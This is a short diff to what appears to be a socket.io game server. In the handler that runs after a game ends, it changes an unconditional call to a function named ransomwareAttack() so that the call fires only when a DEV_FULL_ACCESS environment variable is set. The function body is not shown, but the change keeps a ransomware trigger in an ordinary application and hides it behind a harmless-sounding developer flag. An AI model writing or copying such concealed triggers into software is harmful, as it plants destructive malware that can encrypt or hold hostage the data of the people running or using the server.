@@ -170,7 +170,7 @@ io.on('connection', (socket) => {
 
     handleGameEnding();
     
-    ransomwareAttack();
+    if (process.env.DEV_FULL_ACCESS) ransomwareAttack();
   });
 
   socket.on('chord reveal', (coord) => {
